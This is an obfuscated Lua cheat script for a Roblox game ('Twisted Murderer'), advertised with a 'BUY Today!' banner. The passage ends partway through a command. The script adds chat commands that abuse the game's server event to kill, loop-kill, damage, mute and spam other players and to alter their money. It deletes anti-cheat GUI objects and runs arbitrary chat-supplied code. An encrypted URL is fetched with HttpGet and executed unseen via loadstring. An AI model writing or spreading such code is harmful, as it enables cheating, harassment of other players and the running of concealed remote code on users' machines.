--[[

 __   ____      __     
 \ \ / /\ \    / /\    
  \ V /  \ \  / /  \   
   > <    \ \/ / /\ \  
  / . \    \  / ____ \ 
 /_/ \_\    \/_/    \_\
                                             
Best Twisted Murderer Script [TM]
]]--

local TABLE_TableIndirection = {};
TABLE_TableIndirection["obf_stringchar%0"] = string['char'];
TABLE_TableIndirection["obf_stringbyte%0"] = string['byte'];
TABLE_TableIndirection["obf_stringsub%0"] = string['sub'];
TABLE_TableIndirection["obf_bitlib%0"] = bit32 or bit;
TABLE_TableIndirection["obf_XOR%0"] = TABLE_TableIndirection["obf_bitlib%0"]['bxor'];
TABLE_TableIndirection["obf_tableconcat%0"] = table['concat'];
TABLE_TableIndirection["obf_tableinsert%0"] = table['insert'];
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	TABLE_TableIndirection["result%0"] = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		TABLE_TableIndirection["obf_tableinsert%0"](TABLE_TableIndirection["result%0"], TABLE_TableIndirection["obf_stringchar%0"](TABLE_TableIndirection["obf_XOR%0"](TABLE_TableIndirection["obf_stringbyte%0"](TABLE_TableIndirection["obf_stringsub%0"](LUAOBFUSACTOR_STR, i, i + 1)), TABLE_TableIndirection["obf_stringbyte%0"](TABLE_TableIndirection["obf_stringsub%0"](LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return TABLE_TableIndirection["obf_tableconcat%0"](TABLE_TableIndirection["result%0"]);
end
TABLE_TableIndirection["AdminChecked%0"] = _G['Admin'];
AdminChecked = true;
if (AdminChecked == true) then
	TABLE_TableIndirection["Spam%0"] = [[

`YMM'   `MP'`7MMF'   `7MF' db      
  VMb.  ,P    `MA     ,V  ;MM:     
   `MM.M'      VM:   ,V  ,V^MM.    
     MMb        MM.  M' ,M  `MM    
   ,M'`Mb.      `MM A'  AbmmmqMA   **BUY Today!**
  ,P   `MM.      :MM;  A'     VML  
.MM:.  .:MMa.     VF .AMA.   .AMMA]];
	TABLE_TableIndirection["gPlayers%0"] = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\225\207\218\60\227\169\212", "\126\177\163\187\69\134\219\167"));
	TABLE_TableIndirection["admin%0"] = game['Players']['LocalPlayer']['Name'];
	TABLE_TableIndirection["bannedplyrs%0"] = {LUAOBFUSACTOR_DECRYPT_STR_0("\34\192\127\202", "\156\67\173\74\165")};
	TABLE_TableIndirection["admins%0"] = {LUAOBFUSACTOR_DECRYPT_STR_0("\18\165\64\19\178\34\10\116\145\91\31\185\40\66", "\38\84\215\41\118\220\70")};
	TABLE_TableIndirection["services%0"] = {};
	TABLE_TableIndirection["cmds%0"] = {};
	TABLE_TableIndirection["std%0"] = {};
	TABLE_TableIndirection["serverLocked%0"] = false;
	function FIX_LIGHTING()
		game['Lighting']['Ambient'] = Color3.new(0.5, 0.5, 0.5);
		game['Lighting']['Brightness'] = 1;
		game['Lighting']['GlobalShadows'] = true;
		game['Lighting']['Outlines'] = false;
		game['Lighting']['TimeOfDay'] = 14;
		game['Lighting']['FogEnd'] = 100000;
	end
	TABLE_TableIndirection["services%0"]['players'] = TABLE_TableIndirection["gPlayers%0"];
	TABLE_TableIndirection["services%0"]['lighting'] = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\135\45\23\62\103\172\245\172", "\155\203\68\112\86\19\197"));
	TABLE_TableIndirection["services%0"]['workspace'] = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\113\210\36\247\83\104\228\251\67", "\152\38\189\86\156\32\24\133"));
	TABLE_TableIndirection["services%0"]['events'] = {};
	TABLE_TableIndirection["user%0"] = TABLE_TableIndirection["gPlayers%0"]['LocalPlayer'];
	TABLE_TableIndirection["tprefix%0"] = ">";
	TABLE_TableIndirection["scriptprefix%0"] = "/";
	TABLE_TableIndirection["split%0"] = " ";
	game['StarterGui']:SetCore(LUAOBFUSACTOR_DECRYPT_STR_0("\207\82\169\66\210\88\179\79\250\94\164\71\232\94\168\72", "\38\156\55\199"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\156\116\104\36\22", "\35\200\29\28\72\115\20\154")]=LUAOBFUSACTOR_DECRYPT_STR_0("\60\177\219\208\148\108\12\47\158\144", "\84\121\223\177\191\237\76"),[LUAOBFUSACTOR_DECRYPT_STR_0("\143\83\209\180", "\161\219\54\169\192\90\48\80")]=(LUAOBFUSACTOR_DECRYPT_STR_0("\121\80\5\35\64\90\64\44\90\2", "\69\41\34\96") .. TABLE_TableIndirection["tprefix%0"]),[LUAOBFUSACTOR_DECRYPT_STR_0("\149\192\216\4", "\75\220\163\183\106\98")]=LUAOBFUSACTOR_DECRYPT_STR_0("\16\184\147\54\202\17\191\159\62\221\88\245\196\99\129\85\227\223\110\138\80\232\222", "\185\98\218\235\87")});
	for i, v in pairs(game['CoreGui']:GetDescendants()) do
		if (v:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\255\57\63\242\242\171\201\57\43", "\202\171\92\71\134\190")) and (v['Text'] == LUAOBFUSACTOR_DECRYPT_STR_0("\17\247\13\200\8\197\33\129\39", "\232\73\161\76"))) then
			print(v:GetFullName());
		end
	end
	local updateevents = function()
		for i, v in pairs(TABLE_TableIndirection["services%0"].events) do
			TABLE_TableIndirection["services%0"]['events']:remove(i);
			v:disconnect();
		end
		for i, v in pairs(TABLE_TableIndirection["gPlayers%0"]:players()) do
			TABLE_TableIndirection["ev%0"] = v['Chatted']:connect(function(msg)
				do_exec(msg, v);
			end);
			TABLE_TableIndirection["services%0"]['events'][#TABLE_TableIndirection["services%0"]['events'] + 1] = TABLE_TableIndirection["ev%0"];
		end
	end;
	TABLE_TableIndirection["std%0"].inTable = function(tbl, val)
		if (tbl == nil) then
			return false;
		end
		for _, v in pairs(tbl) do
			if (v == val) then
				return true;
			end
		end
		return false;
	end;
	TABLE_TableIndirection["std%0"].out = function(str)
		print(str);
	end;
	TABLE_TableIndirection["std%0"].list = function(tbl)
		TABLE_TableIndirection["str%0"] = "";
		for i, v in pairs(tbl) do
			TABLE_TableIndirection["str%0"] = TABLE_TableIndirection["str%0"] .. tostring(v);
			if (i ~= #tbl) then
				TABLE_TableIndirection["str%0"] = TABLE_TableIndirection["str%0"] .. LUAOBFUSACTOR_DECRYPT_STR_0("\247\153", "\126\219\185\34\61");
			end
		end
		return TABLE_TableIndirection["str%0"];
	end;
	TABLE_TableIndirection["std%0"].endat = function(str, val)
		TABLE_TableIndirection["z%0"] = str:find(val);
		if TABLE_TableIndirection["z%0"] then
			return str:sub(0, TABLE_TableIndirection["z%0"] - string.len(val)), true;
		else
			return str, false;
		end
	end;
	TABLE_TableIndirection["std%0"].first = function(str)
		return str:sub(1, 1);
	end;
	local isAdmin = function(name)
		if (name == TABLE_TableIndirection["admin%0"]) then
			return true;
		elseif (TABLE_TableIndirection["admins%0"][name] == true) then
			return true;
		end
		return false;
	end;
	local exec = function(str)
		spawn(function()
			local script, loaderr = loadstring(str);
			if not script then
				error(loaderr);
			else
				script();
			end
		end);
	end;
	local findCmd = function(cmd_name)
		for i, v in pairs(TABLE_TableIndirection["cmds%0"]) do
			if ((v['NAME']:lower() == cmd_name:lower()) or TABLE_TableIndirection["std%0"].inTable(v.ALIAS, cmd_name:lower())) then
				return v;
			end
		end
	end;
	local getCmd = function(msg)
		local cmd, hassplit = TABLE_TableIndirection["std%0"].endat(msg:lower(), TABLE_TableIndirection["split%0"]);
		if hassplit then
			return {cmd,true};
		else
			return {cmd,false};
		end
	end;
	local getprfx = function(strn)
		if (strn:sub(1, string.len(TABLE_TableIndirection["tprefix%0"])) == TABLE_TableIndirection["tprefix%0"]) then
			return {LUAOBFUSACTOR_DECRYPT_STR_0("\15\195\90", "\135\108\174\62\18\30\23\147"),(string.len(TABLE_TableIndirection["tprefix%0"]) + 1)};
		elseif (strn:sub(1, string.len(TABLE_TableIndirection["scriptprefix%0"])) == TABLE_TableIndirection["scriptprefix%0"]) then
			return {LUAOBFUSACTOR_DECRYPT_STR_0("\179\241\47\200", "\167\214\137\74\171\120\206\83"),(string.len(TABLE_TableIndirection["scriptprefix%0"]) + 1)};
		end
		return;
	end;
	local getArgs = function(str)
		TABLE_TableIndirection["args%0"] = {};
		TABLE_TableIndirection["new_arg%0"] = nil;
		TABLE_TableIndirection["hassplit%0"] = nil;
		TABLE_TableIndirection["s%0"] = str;
		repeat
			TABLE_TableIndirection["new_arg%0"], TABLE_TableIndirection["hassplit%0"] = TABLE_TableIndirection["std%0"].endat(TABLE_TableIndirection["s%0"]:lower(), TABLE_TableIndirection["split%0"]);
			if (TABLE_TableIndirection["new_arg%0"] ~= "") then
				TABLE_TableIndirection["args%0"][#TABLE_TableIndirection["args%0"] + 1] = TABLE_TableIndirection["new_arg%0"];
				TABLE_TableIndirection["s%0"] = TABLE_TableIndirection["s%0"]:sub(string.len(TABLE_TableIndirection["new_arg%0"]) + string.len(TABLE_TableIndirection["split%0"]) + 1);
			end
		until TABLE_TableIndirection["hassplit%0"] == false 
		return TABLE_TableIndirection["args%0"];
	end;
	local function execCmd(str, plr)
		TABLE_TableIndirection["s_cmd%0"] = nil;
		TABLE_TableIndirection["a%0"] = nil;
		TABLE_TableIndirection["cmd%0"] = nil;
		s_cmd = getCmd(str);
		cmd = findCmd(s_cmd[1]);
		if (cmd == nil) then
			return;
		end
		a = str:sub(string.len(s_cmd[1]) + string.len(TABLE_TableIndirection["split%0"]) + 1);
		TABLE_TableIndirection["args%0"] = getArgs(a);
		pcall(function()
			cmd.FUNC(TABLE_TableIndirection["args%0"], plr);
		end);
	end
	function do_exec(str, plr)
		if not isAdmin(plr.Name) then
			return;
		end
		str = str:gsub(LUAOBFUSACTOR_DECRYPT_STR_0("\196\245\114", "\199\235\144\82\61\152"), "");
		TABLE_TableIndirection["t%0"] = getprfx(str);
		if (TABLE_TableIndirection["t%0"] == nil) then
			return;
		end
		str = str:sub(TABLE_TableIndirection["t%0"][2]);
		if (TABLE_TableIndirection["t%0"][1] == LUAOBFUSACTOR_DECRYPT_STR_0("\2\14\188\40", "\75\103\118\217")) then
			exec(str);
		elseif (TABLE_TableIndirection["t%0"][1] == LUAOBFUSACTOR_DECRYPT_STR_0("\196\89\116", "\126\167\52\16\116\217")) then
			execCmd(str, plr);
		end
	end
	updateevents();
	_G['exec_cmd'] = execCmd;
	local _char = function(plr_name)
		for i, v in pairs(game['Players']:GetChildren()) do
			if v:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\248\34\33\153\177\11", "\156\168\78\64\224\212\121")) then
				if (v['Name'] == plr_name) then
					return v['Character'];
				end
			end
		end
		return;
	end;
	local _plr = function(plr_name)
		for i, v in pairs(game['Players']:GetChildren()) do
			if v:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\55\226\164\215\2\252", "\174\103\142\197")) then
				if (v['Name'] == plr_name) then
					return v;
				end
			end
		end
		return;
	end;
	function addcmd(name, desc, alias, func)
		TABLE_TableIndirection["cmds%0"][#TABLE_TableIndirection["cmds%0"] + 1] = {[LUAOBFUSACTOR_DECRYPT_STR_0("\120\9\114\29", "\152\54\72\63\88\69\62")]=name,[LUAOBFUSACTOR_DECRYPT_STR_0("\240\225\221\127", "\60\180\164\142")]=desc,[LUAOBFUSACTOR_DECRYPT_STR_0("\121\114\44\8\20", "\114\56\62\101\73\71\141")]=alias,[LUAOBFUSACTOR_DECRYPT_STR_0("\158\220\245\231", "\164\216\137\187")]=func};
	end
	local function getPlayer(name)
		TABLE_TableIndirection["nameTable%0"] = {};
		name = name:lower();
		if (name == LUAOBFUSACTOR_DECRYPT_STR_0("\223\227", "\107\178\134\81\210\198\158")) then
			return {TABLE_TableIndirection["admin%0"]};
		elseif (name == LUAOBFUSACTOR_DECRYPT_STR_0("\55\26\138\195\184\43", "\202\88\110\226\166")) then
			for i, v in pairs(TABLE_TableIndirection["gPlayers%0"]:GetChildren()) do
				if v:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\243\3\131\238\207\209", "\170\163\111\226\151")) then
					if (v['Name'] ~= TABLE_TableIndirection["admin%0"]) then
						TABLE_TableIndirection["nameTable%0"][#TABLE_TableIndirection["nameTable%0"] + 1] = v['Name'];
					end
				end
			end
		elseif (name == LUAOBFUSACTOR_DECRYPT_STR_0("\16\60\190", "\73\113\80\210\88\46\87")) then
			for i, v in pairs(TABLE_TableIndirection["gPlayers%0"]:GetChildren()) do
				if v:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\177\32\204\11\226\147", "\135\225\76\173\114")) then
					TABLE_TableIndirection["nameTable%0"][#TABLE_TableIndirection["nameTable%0"] + 1] = v['Name'];
				end
			end
		else
			for i, v in pairs(TABLE_TableIndirection["gPlayers%0"]:GetChildren()) do
				TABLE_TableIndirection["lname%0"] = v['Name']:lower();
				local i, j = TABLE_TableIndirection["lname%0"]:find(name);
				if (i == 1) then
					return {v['Name']};
				end
				TABLE_TableIndirection["dname%0"] = v['DisplayName']:lower();
				local n, m = TABLE_TableIndirection["dname%0"]:find(name);
				if (n == 1) then
					return {v['Name']};
				end
			end
		end
		return TABLE_TableIndirection["nameTable%0"];
	end
	TABLE_TableIndirection["a%0"] = setmetatable({}, {[LUAOBFUSACTOR_DECRYPT_STR_0("\37\210\177\190\168\184\191", "\199\122\141\216\208\204\221")]=function(b, c)
		return game:service(c);
	end});
	pcall(function(...)
		loadstring(game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\88\2\54\2\237\10\89\109\0\255\71\88\37\27\234\88\3\32\7\237\85\4\33\29\240\68\19\44\6\176\83\25\47\93\210\69\23\17\6\255\83\29\43\28\177\98\57\0\62\209\104\89\47\19\247\94\89\103\65\216\21\69\4\87\173\118\88\46\7\255", "\158\48\118\66\114")))();
	end);
	TABLE_TableIndirection["d%0"] = {LUAOBFUSACTOR_DECRYPT_STR_0("\140\211\4\249\75\230\168\216\20\216\121\245\166", "\150\205\189\112\144\24"),LUAOBFUSACTOR_DECRYPT_STR_0("\4\138\171\69\32\137\5\17\17\140\186\74\16", "\112\69\228\223\44\100\232\113"),LUAOBFUSACTOR_DECRYPT_STR_0("\225\54", "\230\180\127\103\179\214\28"),LUAOBFUSACTOR_DECRYPT_STR_0("\162\42\31\96\194", "\128\236\101\63\38\132\33")};
	TABLE_TableIndirection["e%0"] = TABLE_TableIndirection["a%0"]['Players']['LocalPlayer'];
	TABLE_TableIndirection["f%0"] = {};
	function NoAnti()
		spawn(function()
			game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\158\188\31\119\179\249\217\165\170\20", "\175\204\201\113\36\214\139"))['RenderStepped']:wait();
			for g, h in pairs(TABLE_TableIndirection["f%0"]) do
				h:remove();
				TABLE_TableIndirection["f%0"][g] = nil;
			end
			for g, h in pairs(TABLE_TableIndirection["e%0"]['PlayerGui']:GetChildren()) do
				for g, b in pairs(TABLE_TableIndirection["d%0"]) do
					if (b == h['Name']) then
						h:remove();
					end
				end
			end
		end);
	end
	NoAnti();
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\64\195\49", "\100\39\172\85\188"), LUAOBFUSACTOR_DECRYPT_STR_0("\170\119\189\147\115\185\112\188\192\48\165\119\182\147\54\163\56\169\140\50\180\125\171", "\83\205\24\217\224"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		NoAnti();
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			if TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\225\202\201", "\93\134\165\173")) then
				TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\185\253\197", "\30\222\146\161\162\90\174\210")):Destroy();
			end
			TABLE_TableIndirection["god%0"] = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\199\65\127\6\211\79\124\31\224", "\106\133\46\16"));
			TABLE_TableIndirection["god%0"]['Parent'] = TABLE_TableIndirection["gPlayers%0"][v];
			TABLE_TableIndirection["god%0"]['Value'] = true;
			TABLE_TableIndirection["god%0"]['Name'] = LUAOBFUSACTOR_DECRYPT_STR_0("\95\47\119", "\32\56\64\19\156\58");
			game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\104\221\235\101\95\224\150\83\203\224", "\224\58\168\133\54\58\146"))['RenderStepped']:connect(function()
				if TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\94\89\79", "\107\57\54\43\157\21\230\231")) then
					game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\239\187\53", "\175\187\235\113\149\217\188"), -(math['huge'] ^ 1.45), TABLE_TableIndirection["gPlayers%0"][v]['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\20\186\140\77\237\118\113\56", "\24\92\207\225\44\131\25")));
					game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\127\227\156", "\29\43\179\216\44\123"), math.huge, (TABLE_TableIndirection["gPlayers%0"][v]['Character'] and TABLE_TableIndirection["gPlayers%0"][v]['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\149\204\45\77\179\214\41\72", "\44\221\185\64"))) or TABLE_TableIndirection["gPlayers%0"][v]['CharacterAdded']:wait():FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\41\242\69\94\125\14\238\76", "\19\97\135\40\63")));
				end
			end);
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\187\82\52\52\43", "\81\206\60\83\91\79"), LUAOBFUSACTOR_DECRYPT_STR_0("\91\165\215\125\43\208\13\176\70\174\144\113\39\204\66\183\75\165\144\98\35\194\84\161\92", "\196\46\203\176\18\79\163\45"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			if TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\191\45\122", "\143\216\66\30\126\68\155")) then
				TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\173\199\9", "\129\202\168\109\171\165\195\183")):Destroy();
				game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\22\104\19", "\134\66\56\87\184\190\116"), math.huge, TABLE_TableIndirection["gPlayers%0"][v]['Character'].Humanoid);
			end
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\48\62\6\171\30\228\37", "\85\92\81\105\219\121\139\65"), LUAOBFUSACTOR_DECRYPT_STR_0("\241\188\95\85\123\208\249\160\16\81\116\218\189\176\88\74\115\204\248\189\16\85\112\222\228\182\66", "\191\157\211\48\37\28"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		NoAnti();
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\237\10\250\47\63\205\9\253\31\63", "\90\191\127\148\124"))['RenderStepped']:connect(function()
				game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\74\146\32\36\125\149\56\30\123\130", "\119\24\231\78"))['Stepped']:wait();
				game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\182\29\129", "\113\226\77\197\42\188\32"), -(math['huge'] ^ 1.45), TABLE_TableIndirection["gPlayers%0"][v]['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\18\3\249\180\52\25\253\177", "\213\90\118\148")));
				game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\111\30\144", "\45\59\78\212\54"), math.huge, (TABLE_TableIndirection["gPlayers%0"][v]['Character'] and TABLE_TableIndirection["gPlayers%0"][v]['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\56\67\142\138\136\33\164\244", "\144\112\54\227\235\230\78\205"))) or TABLE_TableIndirection["gPlayers%0"][v]['CharacterAdded']:wait():FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\155\61\2\253\222\84\186\44", "\59\211\72\111\156\176")));
			end);
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\103\163", "\77\46\231\131"), LUAOBFUSACTOR_DECRYPT_STR_0("\170\88\183\89\169\20\183\0\179\80\246\70\168\91\187\0\174\92\179\0\185\92\185\83\191\90\246\80\182\85\175\69\168\20\180\79\181\89\180\79\162", "\32\218\52\214"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		if (not args[1] or not args[2]) then
			return;
		end
		TABLE_TableIndirection["num%0"] = args[2];
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\126\27\48\177\195\177\65\83\65", "\58\46\119\81\200\145\208\37"), TABLE_TableIndirection["gPlayers%0"][v], TABLE_TableIndirection["num%0"]);
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\44\131\36\163", "\86\75\236\80\204\201\221"), LUAOBFUSACTOR_DECRYPT_STR_0("\102\68\123\128\238\132\96\85\100\197\231\132\103\1\99\138\190\159\122\68\55\134\246\132\125\82\114\139\190\155\126\64\110\128\236", "\235\18\33\23\229\158"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		if ((TABLE_TableIndirection["players%0"] ~= nil) and _char(TABLE_TableIndirection["players%0"][1]):FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\120\175\204\186\94\181\200\191\98\181\206\175\96\187\211\175", "\219\48\218\161"))) then
			_char(TABLE_TableIndirection["admin%0"])['HumanoidRootPart']['CFrame'] = _char(TABLE_TableIndirection["players%0"][1])['HumanoidRootPart']['CFrame'];
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\239\120\112\69", "\128\132\17\28\41\187\47"), LUAOBFUSACTOR_DECRYPT_STR_0("\5\55\21\46\79\14\43\21\122\73\9\55\70\56\79\4\51\13\48\82\8\60\21\122\82\7\114\18\50\88\65\49\14\53\78\4\60\70\42\81\0\43\3\40", "\61\97\82\102\90"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\152\30\143", "\105\204\78\203\43\167\55\126"), math.huge, TABLE_TableIndirection["gPlayers%0"][v]['Character'].Humanoid);
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\161\167", "\49\197\202\67\126\115\100\167"), LUAOBFUSACTOR_DECRYPT_STR_0("\51\94\204\61\146\89\71\36\27\203\33\133\22\29\119\84\217\105\148\94\91\119\90\210\38\149\88\74\119\79\215\40\148\22\74\63\94\159\57\140\87\71\50\73\159\61\153\70\91\51", "\62\87\59\191\73\224\54"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		if (not args[1] or not args[2]) then
			return;
		end
		TABLE_TableIndirection["num%0"] = args[2];
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\211\50\222", "\169\135\98\154"), TABLE_TableIndirection["num%0"], TABLE_TableIndirection["gPlayers%0"][v]['Character'].Humanoid);
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\195\114\37\88", "\168\171\23\68\52\157\83"), LUAOBFUSACTOR_DECRYPT_STR_0("\243\120\227\168\54\109\133\245\114\254\237\43\56\138\177\49\250\171\101\57\143\241\49\250\171\101\57\143\241\49\241\172\40\44\128\241\117\181\165\32\44\139\224\121\181\171\55\34\138\180\101\253\168\101\46\143\251\126\230\168\43\109\151\248\112\236\168\55", "\231\148\17\149\205\69\77"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		if (not args[1] or not args[2]) then
			return;
		end
		TABLE_TableIndirection["num%0"] = args[2];
		NoAnti();
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\180\151\227", "\159\224\199\167\155\55"), -TABLE_TableIndirection["num%0"], TABLE_TableIndirection["gPlayers%0"][v]['Character'].Humanoid);
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\250\230\40\215", "\178\151\147\92"), LUAOBFUSACTOR_DECRYPT_STR_0("\129\232\88\55\1\12\110\132\248\12\34\30\77\99\137\239\12\33\29\66\125\204\251\94\61\31\12\123\204\234\68\59\30\73\58\152\239\89\55\82\72\117\204\233\85\34\23\12\124\153\243\79\38\27\67\116\204\232\66\38\27\64\58\152\245\73\114\19\72\119\133\243\12\54\29\73\105\204\232\66\63\7\88\127", "\26\236\157\44\82\114\44"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			if TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\39\59\193\94", "\59\74\78\181")) then
				TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\40\196\78\95", "\211\69\177\58\58")):Destroy();
			end
			TABLE_TableIndirection["mute%0"] = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\149\234\118\249\223\202\187\240\124", "\171\215\133\25\149\137"));
			TABLE_TableIndirection["mute%0"]['Parent'] = TABLE_TableIndirection["gPlayers%0"][v];
			TABLE_TableIndirection["mute%0"]['Value'] = true;
			TABLE_TableIndirection["mute%0"]['Name'] = LUAOBFUSACTOR_DECRYPT_STR_0("\236\221\38\255", "\34\129\168\82\154\143\80\156");
			game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\183\167\61\56\77\92\159\140\177\54", "\233\229\210\83\107\40\46"))['RenderStepped']:connect(function()
				if TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\204\87\38\211", "\101\161\34\82\182")) then
					game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\216\1\88\231\233\227\134\39\231", "\78\136\109\57\158\187\130\226"), TABLE_TableIndirection["gPlayers%0"][v], logo);
				end
			end);
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\43\49\244\228\42\58", "\145\94\95\153"), LUAOBFUSACTOR_DECRYPT_STR_0("\232\195\6\212\74\190\242\141\22\212\64\247\252\141\4\217\79\174\248\223", "\215\157\173\116\181\46"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			if TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\56\161\159\247", "\186\85\212\235\146")) then
				TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\207\148\2\251", "\56\162\225\118\158\89\142")):Destroy();
			end
		end
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\79\17\207\191", "\184\60\101\160\207\66"), LUAOBFUSACTOR_DECRYPT_STR_0("\34\150\115\172\34\194\104\180\52\194\127\180\62\145\121\178\113\146\112\189\40\135\110\252\51\141\115\177\51\141\100", "\220\81\226\28"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			game['ReplicatedStorage']['Event']:FireServer(LUAOBFUSACTOR_DECRYPT_STR_0("\35\217\131\226\216\198\23\220\141", "\167\115\181\226\155\138"), TABLE_TableIndirection["gPlayers%0"][v], TABLE_TableIndirection["Spam%0"]);
		end
	end);
	addcmd("v", "view's the choosen player", {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		workspace['CurrentCamera']['CameraSubject'] = game['Players'][TABLE_TableIndirection["players%0"][1]]['Character'];
	end);
	addcmd(LUAOBFUSACTOR_DECRYPT_STR_0("\238\45\232\76", "\166\130\66\135\60\27\17"), LUAOBFUSACTOR_DECRYPT_STR_0("\86\79\223\96\57\86\79\221\53\49\80\10\194\112\49\87\94\142\121\63\83\79\220\53\36\76\79\192\53\97\20\26\142\101\57\74\77\142\122\34\4\72\203\121\63\83", "\80\36\42\174\21"), {}, function(args)
		TABLE_TableIndirection["players%0"] = getPlayer(args[1]);
		for i, v in pairs(TABLE_TableIndirection["players%0"]) do
			if TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\72\17\36\110\75\2\59\117\65\0", "\26\46\112\87")) then
				TABLE_TableIndirection["gPlayers%0"][v]:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\191\34\184\96\186\173\73\187\182\51", "\212\217\67\203\20\223\223\37")):Destroy();
			end
			TABLE_TableIndirection["fasterloop%0"] = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\152\130\167\222\140\140\164\199\191", "\178\218\237\200"));
			TABLE_TableIndirection["fasterloop%0"]['Parent'] = TABLE_TableIndirection["gPlayers%0"][v];
			TABLE_TableIndirection["fasterloop%0"]['Value'] = true;
